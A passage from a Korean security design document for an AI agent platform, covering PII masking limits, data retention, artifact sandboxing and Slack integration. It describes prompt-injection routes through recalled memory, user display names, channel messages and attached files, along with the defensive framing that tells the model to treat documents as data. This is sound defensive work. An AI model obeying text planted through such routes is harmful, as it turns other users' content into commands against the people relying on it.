헤더들이 담고 있는 것으로 여전히 돌아간다. 그것들이 아무것도 담고 있지 않을 때만 경고와 함께
드롭된다.

## PII 필터링, 그리고 그것이 멈추는 곳

`parameters.piiFiltering` 으로 버전별 옵트인. 나가는 메시지와 변수 안의 email, 전화번호, 한국
등록번호, 결제 카드 번호는 모든 LLM 디스패치 전에 되돌릴 수 있고 형식을 보존하는 `[[PII:…]]`
token 으로 치환되고, 응답에서 원본이 복원된다. 스트리밍도 포함해서, token 경계 버퍼링과 함께.
그래서 모델은 실제 값을 결코 보지 않는다. 그 매핑은 subagent transfer 를 넘어 이어진다.

**경계는 LLM 채널과 엔진 자신의 컨텍스트이지, 모든 아웃바운드 호출이 아니다.** 모델이 MCP
도구를 호출하면 `callMcpTool` 은 **복원된** 인자를 받는다. `a@b.com` 으로 메일을 보내라는
도구에는 token 이 아니라 그 주소가 필요하다. 따라서 연결된 MCP 서버는 자신에게 전달된 PII 를
여전히 본다. (subagent transfer 는 정반대다. 자식 agent 는 마스킹된 메시지를 받는다.) MCP 서버
등록은 그 자체의 기준으로 검토하라. `piiFiltering` 은 그것을 다루지 않는다.

**`SaveFile` 이 쓰는 파일도 복원된 쪽이다.** 그 파일은 물어본 사람이 받는 것이고, 그가 같은
화면에서 읽는 답변이 이미 복원된 텍스트다. 마스킹된 사본으로 저장하면 자기 컨텍스트를 위해
치환된 placeholder 로 가득 찬 리포트가 자기에게 돌아온다. 그래서 저장은 `displayArgs` 에서
읽는다. 어느 사본에서 디스패치하는지가 이 경계를 정하는 곳이라는 뜻이기도 하다: 다른 모델로
건너가는 것(transfer 의 `message`, dispatch 의 `tasks`)은 `args`, 사람이나 이미 신뢰된 바깥
시스템에 닿는 것(MCP 디스패치, 이미지 프롬프트, `SaveFile` 의 파일)은 `displayArgs` 다.

**capability discovery 도 그 밖에 있고, 구조적인 이유가 있다.** `dynamicCapabilities` 가 켜진
버전은 가장 최근 사용자 턴들(마지막 하나만이 아니라 짧은 창)을 자기 질의 중 하나로 삼아
카탈로그를 검색하고, 그 텍스트는 임베딩 제공자와 설정된 reranker에게 *그대로* 간다. `resolveRunTools` 는
`engine.runAgent` 보다 먼저 도는데, 필터가 구성되는 곳이자 런이 어떻게 마스킹하는지를 소유하는
유일한 자리가 바로 거기이기 때문이다. 그래서 전화번호를 실은 요청은 필터링이 켜져 있어도
마스킹되지 않은 채 Bedrock 또는 설정된 `/embeddings`·`/rerank` 엔드포인트에 도달한다. 그것을 마스킹했을
디스패치보다 한 호출 앞서서다. 실제로는 chat 채널이 이미 쓰고 있는 것과 같은 제공자 계정이고,
그래서 별도의 노출로 다루는 대신 여기에 적어 둔다. 하지만 이는 플래그를 켤 때 내려야 하는
결정이지 필터가 덮어 주는 무언가가 아니다. 그것을 받아들일 수 없는 배포는 필터링된 버전에서
`dynamicCapabilities` 를 꺼 두고, 그게 기본값이다. **`memoryRecall` 도 같은 자리에 있다.**
엔진이 필터를 구성하기 전에 가장 최근 사용자 턴이 `recall` 질의로 바인딩된 메모리 서버에
전송된다. 연결된 MCP 서버는 이미 복원된 도구 인자를 보므로 이것은 한 턴 앞선 같은 노출이고,
플래그를 켤 때 내려야 하는 같은 결정이다. 돌아온 것은 회상된 텍스트로 *시스템 프롬프트* 에
들어가고, 시스템 프롬프트는 필터링된 버전에서 마스킹**된다**. 그래서 email 을 지목하는 저장된
메모리는 메모리 서버가 그것을 평문으로 갖고 있더라도 모델에게는 `[[PII:…]]` 로 도달한다. 메모리
서버가 무엇을 보관하는지는 이 플래그가 아니라 그 서버 자신의 등록이 관장한다.

**회상된 텍스트는 그 자체로 프롬프트 인젝션 표면이다.** 메모리는 `remember` 가 쓴다. 모델이,
사용자의 말에서, 어떤 대화에서든, project 를 실행할 수 있는 누구에 의해서든. 그리고 그것을
회상하는 이후 모든 대화의 *시스템 메시지* 로 되읽힌다. 그것은 도구 결과보다 한 걸음 더 나간
것이다. 지속되고, 대화와 사람을 넘나든다. 그래서 그 블록은 울타리에 넣고
(`<recalled>…</recalled>`), 저장된 `## …` 헤딩이 프롬프트 자신의 섹션 중 하나인 척하지 못하도록
줄 단위로 인용하며, 지시가 아니라 배경으로 틀 지운다(`src/application/llm/agentAssembly.ts` 의
`rememberedBlock`). 그것은 메모리가 어떻게 *읽히는지* 를 한정한다. 호출자 이름 정제와
마찬가지로, 모델이 자기가 읽는 텍스트에 면역이 되게 만들지는 못한다. project 가 어떤 메모리를
보관하는지는 그 서버 자신의 기준으로 그 서버의 `remember` 정책을 검토할 일이다.

탐지는 정규식 기반이고 email, 전화번호, 한국 주민/외국인등록번호(하이픈 형식, 날짜 절반은
검증한다), 결제 카드 번호(13-19자리, Luhn 검사를 하므로 주문 id 가 *카드로* 마스킹되지 않는다.
검사를 통과하지 못한 구간은 다른 패턴들이 다시 훑어서, 카드 엔티티가 생기기 전에 전화번호
패턴이 마스킹하던 것을 그대로 유지한다)를 다룬다. 보장이 아니라 최선 노력 마스킹으로 다뤄라.
꺼져 있을 때는 필터링하지 않는 경로와 바이트 단위로 동일하다.

## 호출자 컨텍스트

`parameters.callerContext` 로 버전별 옵트인. 켜져 있으면 Slack 런은 누가 묻고 있는지를 모델에게
알려 주고. 표시 이름, 시간대, 아바타의 URL. 한 스레드에 사람이 둘 이상이면 화자마다 라벨을
붙인다. Telegram 런과 Teams 런은 각자의 이벤트가 실어 오는 것으로 같은 일을 한다. 보낸 사람의
이름, 그리고 그 밖에는 아무것도 없다. 둘 다 시간대도 email 도 넘겨주지 않는다.

**이름은 `piiFiltering` 이 마스킹하지 않는 PII 다.** 그 패턴들은 email, 전화번호,
등록번호/카드 번호에 맞고 사람의 이름은 그 어느 것에도 맞지 않으므로, 호출자 블록이 싣는 것은
필터링이 켜져 있어도 쓰인 그대로 모델에 도달한다. 그래서 그 블록은 **email 을 싣지 않으며**,
그래서 이것이 기본 동작이 아니라 버전별 옵트인이다. 켜는 것은 실제 사람의 이름을 프롬프트에,
그리고 제공자가 로깅하는 무엇에든 집어넣겠다는 결정이다.

옵트인은 프롬프트뿐 아니라 조회도 게이트한다. 꺼진 버전은 `users.info` 호출을 아예 일으키지
않으므로, 옵트인하지 않은 project 는 멤버의 id 를 Slack 의 프로필 API 로 결코 보내지 않는다.
그리고 이름이 메시지와 함께 도착하는 Telegram 에서는 그것이 대화 트랜스크립트에 쓰이지도
않는다([데이터 노출과 보존](#데이터-노출과-보존) 참고). **transfer 는 호출자를
자식에게 실어 나르고**(`RunOrigin`), 거기서 자식 버전 자신의 옵트인이 다시 결정한다. 그래서
이름은 몇 홉 떨어져 있든 그것을 요청한 버전에만 도달하고, 소유자가 한 번도 옵트인하지 않은
project 는 그것을 결코 보지 않는다. 해석된 프로필은 워크스페이스별로 메모리에
캐시되고(1시간, 실패는 1분), 크기가 제한되며, 결코 영속되지 않는다.

**표시 이름은 공격자가 통제한다.** 누구나 자기 것을 무엇으로든 설정할 수 있고, 그것이 시스템
프롬프트에 실린다. 공유 스레드의 화자 라벨을 통해, 자기 대화만이 아니라 *다른 사람의* 대화
안에서. `callerFrom`(`src/domain/execution/actor.ts`)은 `RunCaller` 가 만들어지는 유일한
자리이고 따라서 그 이름을 안전하게 만드는 유일한 자리다. 제어 문자는 제거하고, 공백은 한 줄로
접고, 이름은 60자로 제한하며, 아바타는 `https:` URL 일 때만 받아들인다. 그것이 프롬프트
인젝션을 불가능하게 만들지는 않지만. 메시지 본문도 신뢰되지 않는다. 신원 메타데이터가 독자가
볼 수 없는 지시를 숨길 자리가 되는 것은 막는다.

## Slack 출력 알림

LLM 답변과 tool 결과는 Slack mrkdwn으로 전달되므로 텍스트 안의 mention token은 단순한 표시가
아니다. `<@U…>`는 사용자를, `<!subteam^…>`은 사용자 그룹을, `<!channel>`·`<!here>`·
`<!everyone>`은 넓은 청중을 실제로 알릴 수 있다. 그 텍스트는 질문·외부 문서·도구 결과에 의해
영향받으므로 알림 권한으로 취급하지 않는다.

`neutralizeSlackMentions`(`src/domain/slack/outboundText.ts`)가 알림 가능한 완전한 token만
escape한다. `slackClient`는 `chat.postMessage`, `chat.update`, 그리고 stream의 text/chunk 축을
Slack에 쓰기 직전에 모두 이 함수를 통과시킨다. 따라서 streaming 실패 뒤 edit로 물러나거나
마감 시 남은 답을 다시 보내는 경로도 같은 규칙을 받는다. 일반 Markdown, URL link, channel
reference, 알림을 만들지 않는 date token은 보존한다.

## Slack 워크스페이스 읽기

`parameters.slackWorkspace` 로 버전별 옵트인. 켜져 있으면 런은 자기 project 의 봇이 설치된
워크스페이스의 채널 히스토리, 스레드, 사용자 이름을 읽을 수 있다.

**Project 는 공유 카탈로그다** (private project 라면 그 접근 범위 안에서). 따라서 project 를
실행할 수 있는 사람은 누구나 그 봇이 읽을 수 있는 것을 읽을 수 있다. 봇이 초대된 모든
채널이며, `groups:history` 가 적용되는 비공개 채널도 포함이다. 그것이 이것을 Slack 에 연결된 모든 project 가 갖는 capability 가 아니라 버전별
옵트인으로 만든 이유 전부다. 켜는 것은 어떤 채널의 내용을 그 채널 자신의 멤버보다 더 넓은
사람들에게 닿게 하겠다는 결정이다.

두 가지는 빠뜨려서가 아니라 구조적으로 거부된다:

- **쓰기 없음.** `chat:write` 는 봇에게 부여돼 있고. 답장 전송에 필요하다. 의도적으로 어떤
  도구에서도 닿을 수 없다. 런은 자기가 쓰지 않은 텍스트에 조종된다. 글도 올릴 수 있는 런은,
  어떤 채널에 심어 둔 메시지가 봇으로 하여금 다른 곳에서 말하게 만들 수 있는 런이다.
- **email 은 모델에 도달하지 않는다.** `users:read.email` 이 부여돼 있는데도 그렇다.
  `SlackUser` 와 `SlackUsers` 는 이름, 직함, 시간대, 상태 문구, 아바타로 답한다. 동료가
  프로필을 클릭해서 보는 전부다. 주소는 결코 답하지 않는다. 그것은
  [호출자 컨텍스트](#호출자-컨텍스트)가 이미 적용하는 규칙이고, 이유도 같다. email 은 Slack 밖에서
  사람을 식별하며, 어떤 답도 잘 쓰이기 위해 그것을 필요로 하지 않는다.

  주소를 *읽기는* 한다. 한 가지 용도, **런의 결과물을 그 작성자 아래에 정리하기** 위해서다.
  Slack actor 는 워크스페이스 id 이고 artifact 소유자 인덱스는 email 로 키잉되므로, 누군가 봇에게
  그려 달라고 한 그림은 그 project 를 통해서만 닿을 수 있었고 자기 갤러리에서는 결코 닿을 수
  없었다. 그것은 actor 와 분리된 `ownerEmail` 로 실려 나른다. 그 키는 표면별로 usage 를 묶고
  런이 어느 tier 의 지출 상한과 동시성 제한에 답할지를 결정하는데, 등록되지 않은 주소는
  `guest`(동시 런 1개, 월 $2)로 해석되며 이는 다른 결정에 속하는 변경이다. `toUserDetail` 은 그
  주소를 복사하지 않으므로 도구가 반환하는 어떤 것도 그것을 실을 수 없고, 그 조회는
  `callerContext` 에 게이트되지 않는다. 그 파라미터는 모델이 무엇을 듣는지를 결정하는 것이고,
  어떤 사람의 그림이 자기 갤러리에서 사라지는 일은 그것이 일으킬 수 있어야 하는 것이 아니다.

*안으로* 실려 오는 것은 첨부된 문서와 똑같은 방식으로 신뢰되지 않는다. 채널의 메시지는 그 채널에
있는 누구든 쓴 것이고, 그것이 텍스트로 모델에 도달한다. PII 필터링은 다른 것과 마찬가지로 그
도구 결과에도 적용되며(`parameters.piiFiltering`), 턴별 도구 결과 예산이 그 크기를 제한한다.
트랜스크립트의 길이는 Slack 이 정하는 것이므로, 통째로 청구되는 대신 fit 을 거친다.

리더는 봇 token 을 쥐고 있고, 그것은 생성 시점에 바인딩된다. 워크스페이스를 지목하는 도구 인자는
모델이 워크스페이스를 고르게 만들 것이고, 그것이 올바른 모양인 요청은 없다.

## 첨부 문서

문서의 텍스트는 턴 안으로 들어가므로, **누구든 첨부할 수 있는 것은 무엇이든 말할 수 있다.**
Slack 채널에서 그것은 묻는 사람만이 아니다. 봇이 볼 수 있는 곳에 파일을 떨어뜨릴 수 있는
누구든이다.

이에 대해 하는 일: 모든 문서는 `framedDocument`(`src/application/llm/documentParts.ts`)가
감싸며, 파일의 이름을 밝히고 어디서 끝나는지를 표시하고 그 구간을 데이터로 다루고 결코 지시로
다루지 말라고 모델에게 말한다. 이름은 JSON 이스케이프되므로 조작된 파일명이 끝 표시를 위조할 수
없다.

**그것은 완화이지 해결이 아니다.** 어떤 문구도 주입된 텍스트를 안전하게 만들지 못하고, 메시지
본문은 이미 신뢰되지 않았다. agent 의 권한을 그에 맞춰 잡아라. 첨부를 읽는 agent 는 파일을 든
낯선 사람에게 주지 않을 권한을 쥐고 있어서는 안 된다.

알아 둘 만한 다른 속성들:

- **문서는 읽힐 뿐, 실행되거나 렌더링되지 않는다.** 추출은 텍스트만 내놓는다. HTML 은
  가져오거나 스크립트를 돌리거나 해석하는 대신 그 마크업 그대로 읽힌다.
- **문서를 대신해 무언가를 가져오는 것은 없다.** 첨부 안의 URL 은 다른 것과 마찬가지로 텍스트일
  뿐이다. 버전이 바인딩한 도구만이 그것에 작용할 수 있고, 그 도구 자신의 가드 아래에서 그렇다.
- **텍스트는 PII 필터를 지난다.** 버전이 옵트인하면 턴의 나머지와 마찬가지이고, 한계도 같다
  (email, 전화번호, 한국 등록번호, 카드 번호, 이름은 아니다).
- **Chat 은 파일이 아니라 추출된 텍스트를 저장한다.** chat 자신의 보존 기간과 소유자 전용 읽기
  규칙 아래에서다. 10MB PDF 는 결코 영속되지 않는다. 읽어 낸 것 중 턴당 최대 40,000자가 저장된다.

## 데이터 노출과 보존

- Trace 는 **제한된 메타데이터만** 저장한다. 문자 수, token, 비용, 소요 시간, subagent 의
  trace id. 원본 프롬프트와 도구 결과는 영속되지 않지만, trace 의 `error` 와 `warnings` 는 실패
  텍스트를 그대로 최대 1,000자까지 보관하고, 제공자나 도구의 에러 문자열은 내용을 품을 수 있다.
- **런의 추론은 켠 버전에서 복원된 채로 저장된다.** `parameters.reasoningTrace` 를 켠 버전은
  assistant 메시지에 그 런의 사고를 남기는데(`AssistantChatMessage.reasoning`, 메시지당 최대
  40,000바이트), 그것은 `content` 와 같은 출처. 즉 **마스킹이 풀린** 텍스트다. PII 필터는
  *모델이 보는 것*을 제한하지 콘솔에 저장되는 것을 제한하지 않으므로(`content` 도 마찬가지다),
  `piiFiltering` 을 켠 버전에서도 추론은 걸러지지 않은 채 chat 행에 앉는다. 추론은 요청을 모델
  자신의 말로 되풀이하는 자리라 입력이 실어 온 것을 그대로 품기 쉽다. 옵트인인 이유가 이것이고,
  보존 기간은 chat 행과 같다(`RETENTION.chatDays`).
- `/api/metrics` 는 project, 사용자, model 을 지목하지 않는다. 메트릭 라벨은 히스토그램의
  `le` 와 build 정보의 유한한 `version`·`stage`뿐이다.
- 로그 라인은 런의 correlation id 를 실을 뿐, 프롬프트 내용은 결코 싣지 않는다.
- Trace, usage 행, chat, trigger 배달, 인바운드 A2A 태스크는 모두 `expiresAt` 을 지니고
  schedule-scan 틱의 sweep 이 지운다. 티커가 없는 배포는 아무것도 지우지 않는다.
  [OPERATIONS.md](OPERATIONS.md#행-보존) 참고.
- **Telegram·Teams 대화 트랜스크립트** 는 project 의 봇과 주고받은 모든 턴의 *텍스트* 를 7일간
  보관한다. 대화별로 질문과 답을. 두 플랫폼 모두 히스토리를 돌려주지 않아 후속 질문이 그 앞의
  질문을 실어 날라야 하기 때문이다. 그것은 chat 메시지처럼 저장된 사용자 텍스트다. chat 과 달리
  그 대화의 다음 런 외에는 아무것도 그것을 읽지 않는다. 보낸 사람의 플랫폼 사용자 id(Telegram
  user id, Teams 는 Entra object id)는 턴 옆에 저장되고, 보낸 사람의 *이름* 은 버전이 `callerContext` 에 옵트인했을 때만 저장되며, 옵트인을 끈
  버전은 이전에 저장된 이름도 읽지 않는다. 행은 project 파티션에 있어 project 를 지우면 함께
  지워진다.
- **생성된 이미지** 는 `S3_BUCKET_NAME` 이 설정돼 있으면 추측할 수 없는 UUID 키 아래 저장되고,
  chat 행은 주소가 아니라 **오브젝트 키** 를 보관한다. 읽기 시점에 키가 주소가 되며, 수명은
  독자에 맞춰 고른다. chat 뷰에는 15분, Slack 스레드나 저장된 A2A 태스크처럼 지속되는
  무언가에 쓰이는 링크에는 7일(SigV4
  pre-sign 의 상한이고, proxied 토큰도 같은 값을 쓴다). 그 링크는 그것이 함께 온 답을 이미 읽을
  수 있던 청중이 쥔다(`src/application/artifact/urlTtl.ts`). 주소의 *모양* 은
  `ARTIFACT_ACCESS_MODE` 가 정한다:
  - **`proxied`**. 스토어는 앱에게만 닿고 독자는 앱의 주소
    `PUBLIC_BASE_URL/api/objects/<key>?exp=<unix>&sig=<hmac>[&dl=<filename>]` 를 받는다
    (`src/infrastructure/storage/objectUrlToken.ts`). **그 라우트는 세션을 요구하지 않으며
    그것이 계약이다**: 주소를 쥐는 것은 `<img>` 태그, Slack 메시지, 저장된 A2A task라 쿠키를
    낼 수 없다. 토큰이 자격 증명이다. 키·만료·파일명을 함께 덮는 HMAC-SHA256
    이고, 서명 키는 `AES_ENCRYPTION_KEY` 에서 HKDF(`agent-studio/object-url/v1`)로 파생되어 그
    바이트가 저장된 토큰을 암호화하는 바이트와 결코 같지 않다. 증명하는 것은 *이 배포가 이
    키에 대해 이 수명과 이 파일명으로 발행했다* 는 사실뿐이다. 파일명은 장식이 아니라 서명에
    묶여 있어 `dl` 을 떼어 다운로드를 인라인 보기로 바꿀 수 없고, 만료와 서명 불일치는 하나의
    403 으로 답한다(둘을 구별해 주면 위조자에게 어느 쪽을 고칠지 알려 준다). 없어진 오브젝트는
    404, 읽기는 `MAX_PROXIED_OBJECT_BYTES` 에서 끊기며, `Cache-Control: private` 의 max-age 는
    토큰의 남은 수명을 넘지 않는다. 바이트는 콘솔의 origin 에서 나가므로 브라우저가 문서로
    렌더할 수 있는 타입(HTML, SVG, 텍스트)은 `/view` 와 같은 `sandbox; default-src 'none'` 아래
    불투명 origin 에 놓이고, 래스터 이미지와 PDF 만 `frame-ancestors 'none'` 으로 끝난다.
    `next.config.ts` 가 이 주소를 콘솔 헤더에서 제외하는 이유가 그것이다.
  - **`authenticated`**. 스토어의 pre-signed URL. 스토어가 브라우저에서 닿아야 하고 버킷은
    비공개로 남는다.
  - **`public`**. 영구적인 직접 URL. 명시적인 공개 읽기 버킷 정책을 요구하고 URL 을 얻은
    누구에게나 바이트를 노출한다. 애플리케이션 인증은 여전히 갤러리 메타데이터와 삭제를
    보호하지만 오브젝트는 보호하지 않는다. **주소가 보기가 아니라 다운로드인 곳에서는 어쨌든
    미리 서명한다**. 브라우저가 저장할 파일 이름은 `ResponseContentDisposition` 이 실어
    나르는데 S3 는 익명 GET 에서 그것을 거부하므로, 서명되지 않은 링크는 오브젝트를 UUID 키로만
    저장할 수 있다.
  - 레거시 행은 공개 `url` 을 지니고 있을 수 있고 그대로 되읽힌다. 그것을 다시 쓴다고 해서 이미
    공개인 그 오브젝트들에 누가 닿을 수 있는지는 아무것도 바뀌지 않는다. 그러니 **버킷이 한
    번이라도 공개 읽기였다면, 그 안의 기존 오브젝트는 지금도 공개다.** 비공개로 만드는 것은
    운영자의 몫이고, 그렇게 하는 순간 옛 행들은 해석되지 않는다.
  - **페이지는 오브젝트 주소로 나가지 않는다.** `SAVABLE_TYPES` 에 포함된, 사람이 읽도록 만든
    artifact 만 `/view` 를 통해 앱이 바이트로 답한다. 서명한 오브젝트 URL 은 sandbox 헤더를 실을 수 없고,
    한 번 건네지면 그것을 연 사람의 권한보다 오래 살며, `public` 모드에서는 영구다. 임의의
    마크업이 실행되는 영구 주소는 저장소가 아니라 호스팅이다. `/view` 는 삭제와 같은 조건으로
    매 요청을 인가하고, `Content-Security-Policy` 의 `sandbox` 로 문서를 불투명 오리진에
    놓는다. 그래서 그 페이지는 콘솔의 쿠키·스토리지·DOM 에 닿지 못하고 서브리소스를 하나도
    불러오지 못하며, 같은 주소를 새 탭에서 열어도 그대로다. iframe 의 `sandbox` 속성으로는
    닿지 못하는 경우다. `nosniff` 를 함께 보내는 이유는 이 논증 전체가 우리가 선언한 타입 위에
    쓰였기 때문이다. 원격 이미지도 함께 막힌다(`img-src data:`). 모델이 고른 주소에서 가져오는
    그림은 그 호스트에게 "이 페이지가 열렸다"고, 그리고 누가 열었는지를 알려 준다.
  - **HTML 도 정적 문서로 만든 뒤 보낸다.** `sanitize-html` allowlist 는 제목·문단·목록·표·코드·
    data 이미지·안전한 링크를 남기고, script·event handler·`meta`·CSS·form·iframe/object·
    SVG/MathML 을 제거한다. 원문 charset 으로 먼저 해석한 뒤 UTF-8 로 다시 보내므로, sanitizer 를
    우회하려고 잘못된 인코딩을 섞은 바이트는 열리지 않는다. 외부 링크는 사용자가 직접 눌러야만
    이동하며 `Referrer-Policy: no-referrer` 와 `rel=noreferrer` 를 함께 적용한다.
  - **모든 view 가 같은 script 없는 정책을 받는다.** `sandbox` 에 어떤 `allow-*` 도 붙이지 않고
    `default-src 'none'` 을 적용한다. Markdown 은 원시 HTML 을 텍스트로 내보내고 위험한 URL
    스킴을 떼는 렌더러를 지나며, CSV 는 이스케이프된 표가 되고, SVG 는 `<img>` 안에 놓인다.
    HTML 은 위 sanitizer 가 능동 콘텐츠를 제거한다. 애플리케이션 변환과 브라우저 sandbox 중
    하나만 믿지 않고 둘을 함께 적용한다.
  - **`next.config.ts` 의 헤더가 라우트의 헤더를 이긴다. 이것이 sandbox 를 한 번 통째로
    무력화했다.** `headers()` 에 선언한 키는 라우트 핸들러가 세운 같은 키를 *대체*한다. 콘솔용
    `SECURITY_HEADERS` 가 `/:path*` 로 걸려 있었으므로 `/view` 의 응답은 sandbox 정책 대신
    `frame-ancestors 'none'` 을 달고 나갔고, artifact 의 마크업은 콘솔 오리진에서 그 쿠키와
    스토리지를 손 닿는 곳에 두고 실행됐다. 그 라우트가 서명 URL 이 아니라 바이트로 답하는
    이유 전체가, 실제로는 보내지지 않던 헤더였다. 지금은 그 주소만 negative lookahead 로
    제외한다. 콘솔 규칙을 좁히는 대신 그렇게 한 이유는, 내일 추가되는 페이지는 기본으로
    보호받고 자기 정책을 세우는 주소만 비켜 가야 하기 때문이다. **응답 헤더를 라우트에서
    세우는 변경은 이 파일과 충돌하지 않는지 확인하라.**
  - **앱 안의 어떤 것도 오브젝트를 만료시키지 않는다.** 틱의 sweep 은 행을 `DELETE` 한 문장으로
    지우고. 앱은 어느 행이 갔는지 관측하지 않는다. 그래서 같은 시계로 오브젝트를 만료시킬 수
    있는 것은 오브젝트 스토어뿐이다. 접두사별로 라이프사이클 규칙을 붙여라. 그것은
    [OPERATIONS.md](OPERATIONS.md#운영-체크리스트) 의 체크리스트에 있다.
- **Artifact 행** 은 런이 만들어 낸 모든 오브젝트를 지목하고, 그것이 저장된 이미지나 문서를
  나열하고 지울 수 있게 만드는 전부다. 언급할 만한 귀결이 셋 있다:
  - 행은 갤러리를 읽을 수 있게 하려고 **프롬프트의 500자 발췌** 를 보관한다. 그것은
    `ARTIFACT_RETENTION_DAYS` 동안 사는 사용자 텍스트이며, 그것을 실어 온 chat 메시지보다 오래
    남는다. PII 필터링은 *모델* 이 보는 것을 한정할 뿐, 저장되는 것을 한정하지 않는다.
  - project 의 artifact 탭은 그 project 의 소유자와 admin 이 읽을 수 있다. trace 가 쓰는 것과
    같은 규칙이고, 이유도 같다(다른 사람의 런타임 출력을 담고 있다). 실제로는 trace 보다 더 넓은
    노출이다. trace 는 샘플링되고 30일을 보관하지만, artifact 는 모든 오브젝트이고 180일을
    보관한다.
  - artifact 를 지우면 오브젝트를 먼저, 행을 나중에 지우므로 중단된 삭제는 재시도로 수렴한다.
    chat 메시지는 그 키의 사본을 자기 안에 갖고 있으므로 트랜스크립트는 그 뒤로 이미지를 사용할
    수 없음으로 렌더링한다. 확인 문구가 그 사실을 미리 말해 준다.

## 운영 노트

- **고쳐 쓰지 말고 회전시켜라.** 유출된 A2A 키, project token, trigger 시크릿은 콘솔에서
  회전시킨다(`POST …/a2a-key`, `POST …/token`, `rotateSecret: true` 를 실은
  `PUT …/triggers/{id}`). 이전 값은 즉시 동작을 멈춘다.
- **설정 전파는 즉시가 아니다.** 강등된 admin 이나 회전된 A2A 키는 그 쓰기를 처리하지 않은
  인스턴스에서 설정 캐시가 만료될 때까지 계속 동작한다(`SETTINGS_CACHE_TTL_MS`, 기본 5초).
  인스턴스 간 즉시 취소에는 공유 무효화 신호가 필요한데, 아직 없다. 쓰기를 처리한 인스턴스는
  캐시 세대를 쓰므로, 이미 진행 중이던 읽기가 무효화된 항목을 다시 채울 수 없다.
- **인증 rate limit 은 클라이언트 IP 로 키잉하고**, 프록시 뒤에서 그것은
  `TRUSTED_PROXY_CIDRS` 로 해석된다.
  [CONFIGURATION.md](CONFIGURATION.md#인증과-접근-제어) 참고. 프록시 둘 뒤에서
  그것을 비워 두면 모든 요청이 같은 홉으로 해석돼 하나의 공유 버킷에 떨어지므로, 리미터는
  남용자가 아니라 함대 전체를 조인다.
- **AWS 자격 증명은 AWS 를 쓰는 기능에만 필요하고**(Bedrock, AWS S3 자체), 역할이나 표준
  `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY` 쌍으로 온다. MinIO 같은 S3 호환 스토어의
  자격 증명은 그것과 다른 `S3_ACCESS_KEY_ID`/`S3_SECRET_ACCESS_KEY` 쌍이다. 한 프로세스가 둘 다 쓸 수 있다. 키를 이미지에 굽지 마라.
- **`AES_ENCRYPTION_KEY` 를 회전하면 저장된 시크릿만이 아니라 proxied 오브젝트 주소도 전부
  무효가 된다**. 서명 키가 거기서 파생된다. Slack 스레드에 적힌 7일짜리 링크가 그날로 죽는다.
